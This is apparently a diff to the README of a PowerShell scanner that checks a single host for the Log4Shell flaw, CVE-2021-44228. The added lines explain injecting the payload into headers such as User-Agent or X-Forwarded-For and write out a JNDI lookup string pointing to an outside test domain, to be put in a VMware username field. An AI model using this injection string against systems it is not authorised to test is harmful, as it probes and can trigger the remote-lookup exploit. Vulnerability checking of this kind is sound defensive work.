@@ -3,12 +3,14 @@
 **[CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228)**
 
 Perform a scan of a single host (using Powershell) to see if it's vulnerable for the above-mentioned CVE.
+The scripts inject a payload into a request header like `User-Agent`. Important to note is that this is not sufficient for all applications! For example, VMware vCenter is vulnerable because of request header `X-Forwarded-For`. So please do some more research into what the vulnerability exactly is for the software that you're testing and adapt the script where needed.
 
 _Updates_ 
 
 * Added outgoing proxy support.
 * Added `log4j_ps_checker_vcenter.ps1` for VMware vCenter Server.
-	- For VMware vRealize and VMware NXS-T: add payload to username field!
+	- For VMware vRealize and VMware NXS-T: instead of using these scripts, just add the payload to username field like this: `${jndi:ldap://mytestrecord.log4jdnsreq.example.com}`
+
 ---
 
 ## Usage
